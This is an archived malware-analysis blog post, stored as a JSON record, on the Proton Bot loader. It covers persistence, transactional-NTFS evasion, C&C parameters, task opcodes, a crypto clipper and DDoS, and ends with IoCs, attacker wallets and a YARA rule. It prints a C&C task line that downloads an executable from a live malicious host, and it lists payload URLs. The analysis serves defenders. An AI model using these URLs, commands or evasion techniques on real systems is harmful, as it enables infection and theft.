{
    "id": "b7fe1fc9-91d3-4e7b-94e8-85376e350a79",
    "created_at": "2023-01-12T15:08:25.044523Z",
    "updated_at": "2025-03-27T02:16:26.003081Z",
    "deleted_at": null,
    "sha1_hash": "0e80f070eb63b09d075f3ed269e992a4fa6a99fe",
    "title": "2019-05-24 - Overview of Proton Bot, another loader in the wild!",
    "authors": "",
    "file_creation_date": "2022-05-28T01:21:25Z",
    "file_modification_date": "2022-05-28T01:21:25Z",
    "file_size": 982322,
    "plain_text": "# Overview of Proton Bot, another loader in the wild!\n\n**[fumik0.com/2019/05/24/overview-of-proton-bot-another-loader-in-the-wild/](https://fumik0.com/2019/05/24/overview-of-proton-bot-another-loader-in-the-wild/)**\n\nfumko May 24, 2019\n\nLoaders nowadays are part of the malware landscape and it is common to see on sandbox\nlogs results with ‚Äúloader‚Äù tagged on. Specialized loader malware like Smoke or\nHancitor/Chanitor are facing more and more with new alternatives like Godzilla loader,\nstealers, miners and plenty other kinds of malware with this developed feature as an option.\nThis is easily catchable and already explained in earlier articles that I have made.\n\nSince a few months, another dedicated loader malware appears from multiple sources with\nthe name of ‚ÄúProton Bot‚Äù and on my side, first results were coming from a v0.30 version. For\nthis article, the overview will focus on the latest one, the v1.\n\nSold 50$ (with C&C panel) and developed in C++, its cheaper than Smoke (usually seen with\nan average of 200$/300$) and could explain that some actors/customers are making some\nchanges and trying new products to see if it‚Äôs worth to continue with it. The developer behind\n[(glad0ff), is not as his first malware, he is also behind Acrux & Decrux.](https://tracker.fumik0.com/malware/Acrux)\n\n_[Disclamer: This article is not a deep in-depth analysis]_\n\n## Analyzed sample\n\n[1AF50F81E46C8E8D49C44CB2765DD71A [Packed]](https://tracker.fumik0.com/sample/5cdd8a707a324f0bb7ae3451)\n[4C422E9D3331BD3F1BB785A1A4035BBD [Unpacked]](https://www.virustotal.com/#/file/43a9d0ebdd41f21f8252ddb4576c7577478a14083aadeb48bff7331e49ec1580/detection)\n\n\n-----\n\nSomething that I am finally glad by reversing this malware is that I m not in pain for\nunpacking a VM protected sample. By far this is the ‚Äúonly one‚Äù that I‚Äôve analyzed from this\ndeveloper this is not using Themida, VMprotect or Enigma Protector.\n\nSo seeing finally a clean PE is some kind of heaven.\n\n## Behavior\n\nWhen the malware is launched, it‚Äôs retrieving the full path of the executed module by calling\n[GetModuleFilename, this returned value is the key for Proton Bot to verify if this, is a first-](https://docs.microsoft.com/en-us/windows/desktop/api/libloaderapi/nf-libloaderapi-getmodulefilenamea)\ntime interaction on the victim machine or in contrary an already setup and configured bot.\nThe path is compared with a corresponding name & repository hardcoded into the code that\nare obviously obfuscated and encrypted.\n\n_[This call is an alternative to GetCommandLine on this case.](https://msdn.microsoft.com/fr-fr/library/windows/desktop/ms683156.aspx)_\n\nOn this screenshot above, EDI contains the value of the payload executed at the current time\nand EAX, the final location. At that point with a lack of samples in my possession, I cannot\nconfirm this path is unique for all Proton Bot v1 or multiple fields could be a possibility, this\nwill be resolved when more samples will be available for analysis‚Ä¶\n\nNext, no matter the scenario, the loader is forcing the persistence with a scheduled task trick.\nMultiple obfuscated blocs are following a scheme to generating the request until it‚Äôs finally\n[achieved and executed with a simple ShellExecuteA call.](https://docs.microsoft.com/en-us/windows/desktop/api/shellapi/nf-shellapi-shellexecutea)\n\nWith a persistence finally integrated, now the comparison between values that I showed on\nregisters will diverge into two directions :\n\n**_If paths are different_**\n\n[1. Making an HTTP Request on ‚Äúhttp://iplogger.org/1i237a&#8221; for grabbing the Bot IP](http://iplogger.org/1i237a&#8221)\n2. Creating a folder & copying the payload with an unusual way that I will explain later.\n[3. Executing proton bot again in the correct folder with CreateProcessA](https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createprocessa)\n4. Exiting the current module\n\n\n-----\n\n**_if paths are identical_**\n\n1. two threads are created for specific purposes\n\n1. one for the loader\n2. the other for the clipper\n\n2. At that point, all interactions between the bot and the C&C will always be starting with\n\nthis format :\n```\n/page.php?id=%GUID%\n\n```\n%GUID% is, in fact, the Machine GUID, so on a real scenario, this could be in an example\nthis value ‚Äúfdff340f-c526-4b55-b1d1-60732104b942‚Äù.\n\n### Summary\n\nMutex\n```\ndsks102d8h911s29\n\n```\nLoader Path\n```\n%APPDATA%/NvidiaAdapter\n\n```\nLoader Folder\n\nSchedule Task\n\n\n-----\n\nProcess\n\n## A unique way to perform data interaction\n\nThis loader has an odd and unorthodox way to manipulate the data access and storage by\nusing the [Windows KTM library. This is way more different than most of the malware that is](https://www.win7dll.info/ktmw32_dll.html)\nusually using easier ways for performing tasks like creating a folder or a file by the help of\nthe [FileAPI module.](https://docs.microsoft.com/en-us/windows/desktop/api/fileapi/index)\n\nThe idea here, it is permitting a way to perform actions on data with the guarantee that there\nis not even a single error during the operation. For this level of reliability and integrity, the\n[Kernel Transaction Manager (KTM) comes into play with the help of the Transaction NTFS](https://technet.microsoft.com/fr-fr/office/bb968806(v=vs.80))\n(TxF).\n\nFor those who aren‚Äôt familiar with this, there is an example here :\n\n\n-----\n\n[1. CreateTransaction is called for starting the transaction process](https://docs.microsoft.com/en-us/windows/desktop/api/ktmw32/nf-ktmw32-createtransaction)\n2. The requested task is now called\n[3. If everything is good, the Transaction is finalized with a commit (CommitTransaction)](https://docs.microsoft.com/en-us/windows/desktop/api/ktmw32/nf-ktmw32-committransaction)\n\nand confirming the operation is a success\n4. If a single thing failed (even 1 among 10000 tasks), the transaction is rolled back with\n\n[RollbackTransaction](https://docs.microsoft.com/en-us/windows/desktop/api/ktmw32/nf-ktmw32-rollbacktransaction)\n\nIn the end, this is the task list used by ProtonBot are:\n\n[DeleteFileTransactedA](https://docs.microsoft.com/en-us/windows/desktop/api/winbase/nf-winbase-deletefiletransacteda)\n[CopyFileTransactedA](https://docs.microsoft.com/en-us/windows/desktop/api/winbase/nf-winbase-copyfiletransacteda)\n[SetFileAttributesTransactedA](https://docs.microsoft.com/en-us/windows/desktop/api/winbase/nf-winbase-setfileattributestransacteda)\n[CreateDirectoryTransactedA](https://docs.microsoft.com/en-us/windows/desktop/api/winbase/nf-winbase-createdirectorytransacteda)\n\nThis different way to interact with the Operating System is a nice way to escape some API\nmonitoring or avoiding triggers from sandboxes & specialized software. It‚Äôs a matter time now\nto hotfix and adjusts this behavior for having better results.\n\n_The API used has been also used for another technique with analysis of the banking_\n_[malware Osiris by](https://blog.malwarebytes.com/threat-analysis/2018/08/process-doppelganging-meets-process-hollowing_osiris/)_ _[@hasherezade](https://twitter.com/hasherezade)_\n\n\n-----\n\n## Anti-Analysis\n\nThere are three main things exploited here:\n\nStack String\nXor encryption\nXor key adjusted with a NOT operand\n\nBy guessing right here, with the utilization of stack strings, the main ideas are just to create\nsome obfuscation into the code, generating a huge amount of blocks during\ndisassembling/debugging to slow down the analysis. This is somewhat, the same kind of\n[behavior that Predator the thief is abusing above v3 version.](https://securelist.com/a-predatory-tale/89779/)\n\nThe screenshot as above is an example among others in this malware about techniques\npresented and there is nothing new to explain in depth right here, these have been\nmentioned multiple times and I would say with humor that C++ itself is some kind of AntiAnalysis, that is enough to take some aspirin.\n\n## Loader Architecture\n\nThe loader is divided into 5 main sections :\n\n1. Performing C&C request for adding the Bot or asking a task.\n2. Receiving results from C&C\n3. Analyzing OpCode and executing to the corresponding task\n4. Sending a request to the C&C to indicate that the task has been accomplished\n\n\n-----\n\n5. Repeat the process [GOTO 1]\n\n### C&C requests\n\n**Former loader request**\n\n_Path base_\n```\n/page.php\n\n```\n_Required arguments_\n\n**Argument** **Meaning** **API Call / Miscellaneous**\n\nid Bot ID RegQueryValueExA ‚Äì MachineGUID\n\nos Operating System RegQueryValueExA ‚Äì ProductName\n\npv Account Privilege Hardcoded string ‚Äì ‚ÄúAdmin‚Äù\n\na Antivirus Hardcoded string ‚Äì ‚ÄúNot Supported‚Äù\n\ncp CPU [Cpuid (Very similar code)](https://docs.microsoft.com/en-us/cpp/intrinsics/cpuid-cpuidex?view=vs-2019)\n\ngp GPU EnumDisplayDevicesA\n\nip IP GetModuleFileName (Yup, it‚Äôs weird)\n\nname Username RegQueryValueExA ‚Äì RegisteredOwner\n\nver Loader version Hardcoded string ‚Äì ‚Äú1.0 Release‚Äù\n\nlr ??? Hardcoded string ‚Äì ‚ÄúComing Soon‚Äù\n\n**Additional fields when a task is completed**\n\n**Argument** **Meaning** **API Call / Miscellaneous**\n\nop OpCode Integer\n\ntd Task ID Integer\n\n### Task format\n\nThe task format is really simple and is presented as a simple structure like this.\n```\nTask Name;Task ID;Opcode;Value\n\n### Tasks OpCodes\n\n```\n\n-----\n\nWhen receiving the task, the OpCode is an integer value that permits to reach the specified\ntask. At that time I have count 12 possible features behind the OpCode, some of them are\nalmost identical and just a small tweak permits to differentiate them.\n\n**OpCode** **Feature**\n\n1 Loader\n\n2 Self-Destruct\n\n3 Self-Renewal\n\n4 Execute Batch script\n\n5 Execute VB script\n\n6 Execute HTML code\n\n7 Execute Powershell script\n\n8 Download & Save new wallpaper\n\n9 ???\n\n10 ???\n\n11 ???\n\n12 (Supposed) DDoS\n\nFor those who want to see how the loader part looks like on a disassembler, it‚Äôs quite\npleasant (sarcastic)\n\n\n-----\n\n_the joy of C++_\n\n## Loader main task\n\nThe loader task is set to the OpCode 1. in real scenario this could remain at this one :\n```\nnewtask;112;1;http://187.ip-54-36-162.eu/uploads/me0zam1czo.exe\n\n```\n\n-----\n\nThis is simplest but accurate to do the task\n\n[1. Setup the downloaded directory on %TEMP% with GetTempPathA](https://docs.microsoft.com/en-us/windows/desktop/api/fileapi/nf-fileapi-gettemppatha)\n[2. Remove footprints from cache DeleteUrlCacheEntryA](https://docs.microsoft.com/en-us/windows/desktop/api/wininet/nf-wininet-deleteurlcacheentrya)\n[3. Download the payload ‚Äì URLDownloadToFileA](https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/platform-apis/ms775123(v%3Dvs.85))\n4. Set Attributes to the file by using transactions\n\n[5. Execute the Payload ‚Äì ShellExecuteA](https://docs.microsoft.com/en-us/windows/desktop/api/shellapi/nf-shellapi-shellexecutea)\n\n## Other features\n\n### Clipper\n\nClipper fundamentals are always the same and at that point now, I‚Äôm mostly interested in\nhow the developer decided to organize this task. On this case, this is simplest but enough to\nperforms accurately some stuff.\n\nThe first main thing to report about it, it that the wallets and respective regular expressions\nfor detecting them are not hardcoded into the source code and needs to perform an HTTP\nrequest only once on the C&C for setting-up this :\n```\n/page.php?id=%GUID%&clip=get\n\n```\nThe response is a consolidated list of a homemade structure that contains the configuration\ndecided by the attacker. The format is represented like this:\n\n\n-----\n\n```\n[\n id,       # ID on C&C\n name,      # ID Name (i.e: Bitcoin)\n regex,     # Regular Expression for catching the Wallet\n attackerWallet # Switching victim wallet with this one\n]\n\n```\nAt first, I thought, there is a request to the C&C when the clipper triggered a matched regular\nexpression, but it‚Äôs not the case here.\n\nOn this case, the attacker has decided to target some wallets:\n\nBitcoin\nDash\nLitecoin\nZcash\nEthereum\nDogeCoin\n\n_if you want an in-depth analysis of a clipper task, I recommend you to check my other articles_\n_[that mentioned in details this (Megumin &](https://fumik0.com/2019/05/03/lets-nuke-megumin-trojan/)_ _[Qulab).](https://fumik0.com/2019/03/25/lets-play-with-qulab-an-exotic-malware-developed-in-autoit/)_\n\n### DDos\n\nProton has an implemented layer 4 DDoS Attack, by performing spreading the server TCP\n[sockets requests with a specified port using WinSocks](https://docs.microsoft.com/en-us/windows/desktop/api/winsock2/nf-winsock2-socket)\n\n\n-----\n\n### Executing scripts\n\nThe loader is also configured to launch scripts, this technique is usually spotted and shared\nby researchers on Twitter with a bunch of raw Pastebin links downloaded and adjusted to be\nable to work.\n\n\n-----\n\n1. Deobfuscating the selected format (.bat on this case)\n\n2. Download the script on %TEMP%\n3. Change type of the downloaded script\n[4. Execute the script with ShellExecuteA](https://docs.microsoft.com/en-us/windows/desktop/api/shellapi/nf-shellapi-shellexecutea)\n\n_Available formats are .bat, .vbs, .ps1, .html_\n\n### Wallpaper\n\nThere is a possibility to change the wallpaper of bot, by sending the OpCode 8 with an\nindicated following image to download. The scenario remains the same from the loader main\ntask, with the exception of a different API call at the end\n\n[1. Setup the downloaded directory on %TEMP% with GetTempPathA](https://docs.microsoft.com/en-us/windows/desktop/api/fileapi/nf-fileapi-gettemppatha)\n[2. Remove footprints from cache DeleteUrlCacheEntryA](https://docs.microsoft.com/en-us/windows/desktop/api/wininet/nf-wininet-deleteurlcacheentrya)\n[3. Download the image ‚Äì URLDownloadToFileA](https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/platform-apis/ms775123(v%3Dvs.85))\n[4. Change the wallpaper with SystemParametersInfosA](https://docs.microsoft.com/en-us/windows/desktop/api/winuser/nf-winuser-systemparametersinfoa)\n\nOn this case the structure will be like this :\n```\nBOOL SystemParametersInfoA ( \n    UINT uiAction -> 0x0014 (SPI_SETDESKWALLPAPER)\n   UINT uiParam  -> 0\n    PVOID pvParam -> %ImagePath%\n    UINT fWinIni  -> 1\n);\n\n```\n\n-----\n\nI can t understand clearly the utility on my side but surely has been developed for a reason.\nMaybe in the future, I will have the explanation or if you have an idea, let me share your\nthought about it üôÇ\n\n## Example in the wild\n\nA few days ago, a ProtonBot C&C (187.ip-54-36-162.eu) was quite noisy to spread malware\nwith a list of compatibilized 5000 bots. It‚Äôs enough to suggest that it is used by some\nbusiness already started with this one.\n\nNotable malware hosted and/or pushed by this Proton Bot\n\n[Qulab](https://fumik0.com/2019/03/25/lets-play-with-qulab-an-exotic-malware-developed-in-autoit/)\nProtonBot üôÇ\nCoinMiners\nC# RATs\n\nThere is also another thing to notice, is that the domain itself was also hosting other\npayloads not linked to the loader directly and one sample was also spotted on another\ndomain & loader service (Prostoloader). It‚Äôs common nowadays to see threat actors paying\nmultiple services, to spread their payloads for maximizing profits.\n\n[All of them are accessible on the malware tracker.](https://tracker.fumik0.com/search=54.36.162.187)\n\n[*] Yellow means duplicate hashes in the database.\n\n## IoC\n\n\n-----\n\n### Proton Bot\n\n187.ip-54-36-162.eu/cmdd.exe\n9af4eaa0142de8951b232b790f6b8a824103ec68de703b3616c3789d70a5616f\n\n### Payloads from Proton Bot C2\n\n**Urls**\n\n187.ip-54-36-162.eu/uploads/0et5opyrs1.exe\n187.ip-54-36-162.eu/uploads/878gzwvyd6.exe\n187.ip-54-36-162.eu/uploads/8yxt7fd01z.exe\n187.ip-54-36-162.eu/uploads/9xj0yw51k5.exe\n187.ip-54-36-162.eu/uploads/lc9rsy6kjj.exe\n187.ip-54-36-162.eu/uploads/m3gc4bkhag.exe\n187.ip-54-36-162.eu/uploads/me0zam1czo.exe\n187.ip-54-36-162.eu/uploads/Project1.exe\n187.ip-54-36-162.eu/uploads/qisny26ct9.exe\n187.ip-54-36-162.eu/uploads/r5qixa9mab.exe\n187.ip-54-36-162.eu/uploads/rov08vxcqg.exe\n187.ip-54-36-162.eu/uploads/ud1lhw2cof.exe\n187.ip-54-36-162.eu/uploads/v6z98xkf8w.exe\n187.ip-54-36-162.eu/uploads/vww6bixc3p.exe\n187.ip-54-36-162.eu/uploads/w1qpe0tkat.exe\n\n**Hashes**\n\n349c036cbe5b965dd6ec94ab2c31a3572ec031eba5ea9b52de3d229abc8cf0d1\n42c25d523e4402f7c188222faba134c5eea255e666ecf904559be399a9a9830e\n5de740006b3f3afc907161930a17c25eb7620df54cff55f8d1ade97f1e4cb8f9\n6a51154c6b38f5d1d5dd729d0060fa4fe0d37f2999cb3c4830d45d5ac70b4491\n77a35c9de663771eb2aef97eb8ddc3275fa206b5fd9256acd2ade643d8afabab\n7d2ccf66e80c45f4a17ef4ac0355f5b40f1d8c2d24cb57a930e3dd5d35bf52b0\naeab96a01e02519b5fac0bc3e9e2b1fb3a00314f33518d8c962473938d48c01a\nba2b781272f88634ba72262d32ac1b6f953cb14ccc37dc3bfb48dcef76389814\nbb68cd1d7a71744d95b0bee1b371f959b84fa25d2139493dc15650f46b62336c\nc2a3d13c9cba5e953ac83c6c3fe6fd74018d395be0311493fdd28f3bab2616d9\ncbb8e8624c945751736f63fa1118032c47ec4b99a6dd03453db880a0ffd1893f\ncd5bffc6c2b84329dbf1d20787b920e5adcf766e98cea16f2d87cd45933be856\nd3f3a3b4e8df7f3e910b5855087f9c280986f27f4fdf54bf8b7c777dffab5ebf\nd3f3a3b4e8df7f3e910b5855087f9c280986f27f4fdf54bf8b7c777dffab5ebf\ne1d8a09c66496e5b520950a9bd5d3a238c33c2de8089703084fcf4896c4149f0\n\n### Domains\n\n\n-----\n\n### PDB\n\n\n187.ip-54-36-162.eu\n\nE:\\PROTON\\Release\\build.pdb\n\n\n### Wallets\n\n3HAQSB4X385HTyYeAPe3BZK9yJsddmDx6A\nXbQXtXndTXZkDfb7KD6TcHB59uGCitNSLz\nLTwSJ4zE56vZhhFcYvpzmWZRSQBE7oMSUQ\nt1bChFvRuKvwxFDkkm6r4xiASBiBBZ24L6h\n1Da45bJx1kLL6G6Pud2uRu1RDCRAX3ZmAN\n0xf7dd0fc161361363d79a3a450a2844f2a70907c6\nD917yfzSoe7j2es8L3iDd3sRRxRtv7NWk8\n\n### Threat Actor\n\nGlad0ff (Main)\nProtonSellet (Seller)\n\n## Yara\n\nrule ProtonBot : ProtonBot {\n\nmeta:\n\ndescription = ‚ÄúDetecting ProtonBot v1‚Äù\n\nauthor = ‚ÄúFumik0_‚Äù\n\ndate = ‚Äú2019-05-24‚Äù\n\nstrings:\n\n$mz = {4D 5A}\n\n$s1 = ‚Äúproton bot‚Äù wide ascii\n\n$s2 = ‚ÄúBuild.pdb‚Äù wide ascii\n\n$s3 = ‚Äúktmw32.dll‚Äù wide ascii\n\n$s4 = ‚Äújson.hpp‚Äù wide ascii\n\ncondition:\n\n$mz at 0 and (all of ($s*))\n\n}\n\n## Conclusion\n\n\n-----\n\nYoung malware means fresh content and with time and luck, could impact the malware\nlandscape. This loader is cheap and will probably draw attention to some customers (or even\nalready the case), to have less cost to maximize profits during attacks. ProtonBot is not a\nsophisticated malware but it‚Äôs doing its job with extra modules for probably being more\nattractive. Let‚Äôs see with the time how this one will evolve, but by seeing some kind of odd\ncases with plenty of different malware pushed by this one, that could be a scenario among\nothers that we could see in the future.\n\nOn my side, it‚Äôs time to chill a little.\n\nSpecial Thanks ‚Äì S!ri & Snemes\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2019/2019-05-24 - Overview of Proton Bot, another loader in the wild!.pdf"
    ],
    "report_names": [
        "2019-05-24 - Overview of Proton Bot, another loader in the wild!.pdf"
    ],
    "threat_actors": [
        {
            "id": "75108fc1-7f6a-450e-b024-10284f3f62bb",
            "created_at": "2024-11-01T02:00:52.756877Z",
            "updated_at": "2025-03-27T02:00:55.544216Z",
            "deleted_at": null,
            "main_name": "Play",
            "aliases": null,
            "source_name": "MITRE:Play",
            "tools": [
                "Nltest",
                "AdFind",
                "PsExec",
                "Wevtutil",
                "Cobalt Strike",
                "Playcrypt",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1673536105,
    "ts_updated_at": 1743041786,
    "ts_creation_date": 1653700885,
    "ts_modification_date": 1653700885,
    "files": {
        "pdf": "https://archive.orkl.eu/0e80f070eb63b09d075f3ed269e992a4fa6a99fe.pdf",
        "text": "https://archive.orkl.eu/0e80f070eb63b09d075f3ed269e992a4fa6a99fe.txt",
        "img": "https://archive.orkl.eu/0e80f070eb63b09d075f3ed269e992a4fa6a99fe.jpg"
    }
}